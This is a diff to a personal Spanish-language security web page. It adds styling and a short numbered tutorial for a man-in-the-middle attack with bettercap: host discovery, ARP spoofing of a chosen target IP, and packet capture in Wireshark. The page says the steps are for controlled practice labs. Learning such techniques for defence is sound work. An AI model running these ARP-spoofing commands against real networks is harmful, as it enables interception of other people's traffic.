@@ -1,11 +1,54 @@
 <!DOCTYPE html>
 <html lang="es">
+
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Daniel | Seguridad</title>
     <link rel="stylesheet" href="/CSS/styles.css">
+    <style>
+        .Contenido h2 {
+            font-size: 40px;
+        }
+
+        .Contenido h1 {
+            font-size: 70px;
+            text-decoration: underline;
+        }
+
+        .Contenido p {
+            font-size: 30px;
+        }
+
+        .Contenido h3 {
+            font-size:
+                35px;
+            font-weight: normal;
+        }
+
+        .Contenido {
+            text-align: justify;
+            /* margin-left: 15%;
+        margin-right: 15%;*/
+            font-family: Arial, Helvetica, sans-serif;
+            font-size: 30px;
+            background-color: darkgrey;
+            width: 1300;
+            height: auto;
+            padding-top: 15px;
+            padding-bottom: 10px;
+            padding-left: 5%;
+            padding-right: 10%;
+            font-size: 50px;
+            margin-top: 30px;
+        }
+
+        .Contenido strong {
+            color: rgb(198, 4, 4);
+        }
+    </style>
 </head>
+
 <body>
     <Header>
         <nav>
@@ -25,12 +68,33 @@
             </ul>
         </nav>
     </Header>
-    
-    
+    <div class="Contenido">
+        <h1>Ciberseguridad / <strong>Pendiente de update</strong></h1>
+        <h2>Realizar ataque Man in the middle</h2>
+        <h3>Usar la informacion en ambientes de practica controlados sin dañar equipos ajenos</h3>
+        <br>
+        <p>Ataque Man in the Middle con bettercap:</p>
 
- <footer>
-        <h2> Daniel Canelo</h2>        <br>
+        <p> instalar paquete bettecap (Debian)</p>
+        <p>1. sudo bettercap -iface <nombre de la interfaz de red> ej: eth0 o wlan0</p>
+        <p>2. net.probe on lanza un escaneo de los equipos conectados</p>
+        <p>3. net.show muestra una tabla con informacion de los equipos conectados</p>
+        <p>4. set arp.spoof.fullduplex true</p>
+        <p>5. set arp.spoof.targets ip a atacar</p>
+        <p>6. Se recomienda iniciar wireshark antes del ataque para ver de forma comoda los paquetes </p>
+        <p>En wireshark seleccionar la interfaz de red a usar (eth0, wlan0...) y para filtrar por ip paquetes escribir
+        </p>
+        <p>ip.addr == ip</p>
+        <p>7. arp.spoof on para iniciar el ataque</p>
+
+    </div>
+
+
+
+    <footer>
+        <h2> Daniel Canelo</h2> <br>
         <p>Contacto: DanielCaneloCamacho@hotmail.com</p>
     </footer>
 </body>
+
 </html>
